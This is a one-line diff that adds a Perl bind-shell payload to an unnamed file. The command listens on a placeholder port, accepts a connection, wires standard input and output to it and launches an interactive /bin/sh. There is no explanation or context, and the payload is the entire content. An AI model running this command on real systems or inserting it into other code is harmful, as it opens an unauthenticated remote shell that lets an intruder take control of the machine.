@@ -1,0 +1,1 @@
+perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(attacker_port,INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");'
